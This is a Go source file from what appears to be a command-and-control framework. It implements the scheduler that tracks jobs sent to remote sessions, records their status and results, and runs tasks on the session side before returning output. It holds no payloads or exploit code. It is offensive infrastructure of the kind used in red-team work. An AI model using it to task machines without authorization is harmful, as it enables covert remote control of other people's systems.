package c2

import (
	"context"
	"strconv"
	"time"

	"github.com/PurpleSec/escape"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// These are status values that indicate the general status of the Job.
const (
	Waiting  status = 0
	Accepted status = iota
	Receiving
	Completed
	Error
)

// ErrCannotAssign is an error returned by the 'Schedule' function when the random loop cannot find a valid
// JobID (unused). This may occur in random circumstances when the Scheduler is overused.
var ErrCannotAssign = xerr.New("unable to assign a unused JobID (is Scheduler full?)")

// Job is a struct that is used to track and manage Tasks given to Session Clients. This struct has function callbacks
// that can be used to watch for completion and also offers a Wait function to pause execution until a response is received.
type Job struct {
	Start, Complete time.Time
	ctx             context.Context

	Result  *com.Packet
	Session *Session
	Update  func(*Job)
	cancel  context.CancelFunc

	Error              string
	ID, Frags, Current uint16
	Type               uint8
	Status             status
}
type status uint8

// Scheduler is a handler that can manage and schedule Packets as Jobs to be sent to a Session and tracked. The
// resulting output (or errors) can be tracked by the resulting Job structs.
type Scheduler struct{}

// Wait will block until the Job is completed or the parent Server is shutdown.
func (j *Job) Wait() {
	<-j.ctx.Done()
}

// IsDone returns true when the Job has received a response.
func (j *Job) IsDone() bool {
	select {
	case <-j.ctx.Done():
		return true
	default:
		return false
	}
}

// IsError returns true when the Job has received a response, but the response is an error.
func (j *Job) IsError() bool {
	if !j.IsDone() {
		return false
	}
	return len(j.Error) > 0
}
func (s status) String() string {
	switch s {
	case Error:
		return "error"
	case Waiting:
		return "waiting"
	case Accepted:
		return "accepted"
	case Completed:
		return "completed"
	}
	return "invalid"
}

// JSON returns the data of this Job as a JSON blob.
func (j Job) JSON(w *data.Chunk) {
	if !Logging {
		return
	}
	w.Write([]byte(`{"id":` + strconv.Itoa(int(j.ID)) + `,` +
		`"type":` + strconv.Itoa(int(j.Type)) + `,` +
		`"error":` + escape.JSON(j.Error) + `,` +
		`"status":"` + j.Status.String() + `",` +
		`"start":"` + j.Start.Format(time.RFC3339) + `"`,
	))
	if j.Session != nil && !j.Session.ID.Empty() {
		w.Write([]byte(`,"host":"` + j.Session.ID.String() + `"`))
	}
	if !j.Complete.IsZero() {
		w.Write([]byte(`,"complete":"` + j.Complete.Format(time.RFC3339) + `"`))
	}
	if j.Result != nil {
		w.Write([]byte(`,"result":` + strconv.Itoa(j.Result.Len())))
	}
	w.WriteUint8(uint8('}'))
}

// MarshalJSON fulfils the JSON Marshaler interface.
func (j Job) MarshalJSON() ([]byte, error) {
	b := buffers.Get().(*data.Chunk)
	j.JSON(b)
	d := b.Payload()
	returnBuffer(b)
	return d, nil
}

// Handle is the function that inherits the Mux interface. This is used to find and redirect received Jobs. This
// Mux is rarely used in Sessions.
func (Scheduler) Handle(s *Session, p *com.Packet) {
	if s == nil || p == nil || p.Job <= 1 {
		return
	}
	if p.ID < 20 && p.ID != MvUpdate {
		return
	}
	if s.jobs == nil || len(s.jobs) == 0 {
		if Logging {
			s.s.Log.Warning("[%s:Sched] Received an un-tracked Job ID %d!", s.ID, p.Job)
		}
		return
	}
	j, ok := s.jobs[p.Job]
	if !ok {
		if Logging {
			s.s.Log.Warning("[%s:Sched] Received an un-tracked Job ID %d!", s.ID, p.Job)
		}
		return
	}
	if Logging {
		s.s.Log.Trace("[%s:Sched] Received response for Job ID %d.", s.ID, j.ID)
	}
	if j.Result, j.Complete, j.Status = p, time.Now(), Completed; p.Flags&com.FlagError != 0 {
		j.Status = Error
		if err := p.ReadString(&j.Error); err != nil {
			j.Error = err.Error()
		}
	}
	delete(s.jobs, j.ID)
	if j.cancel(); j.Update != nil {
		s.s.events <- event{j: j, jFunc: j.Update}
	}
}

// Task will execute the provided Tasker with the provided Packet as the data input. The Session will be used to return
// the results to and will supply the context to run in. This function may return instantly if the Task is thread
// oriented, but will send the results after completion or error without further interaction.
func Task(t task.Tasker, s *Session, p *com.Packet) {
	if t.Thread() {
		go doTask(t, s, p)
	} else {
		doTask(t, s, p)
	}
}
func doTask(t task.Tasker, s *Session, p *com.Packet) {
	if Logging {
		s.log.Debug("[%s:Task] Starting Task with JobID %d.", s.ID, p.Job)
	}
	r, err := t.Do(s.ctx, p)
	if r == nil {
		r = new(com.Packet)
	}
	if p.Reset(); err != nil {
		if Logging {
			s.log.Error("[%s:Task] Received error during JobID %d Task runtime: %s!", s.ID, p.Job, err.Error())
		}
		r.Flags |= com.FlagError
		r.Clear()
		r.WriteString(err.Error())
	} else {
		if Logging {
			s.log.Debug("[%s:Task] Task with JobID %d completed!", s.ID, p.Job)
		}
	}
	r.ID, r.Job = MvResult, p.Job
	if err := s.write(false, r); err != nil {
		if Logging {
			s.log.Error("[%s:Task] Received error sending Task results: %s!", s.ID, err.Error())
		}
	}
}
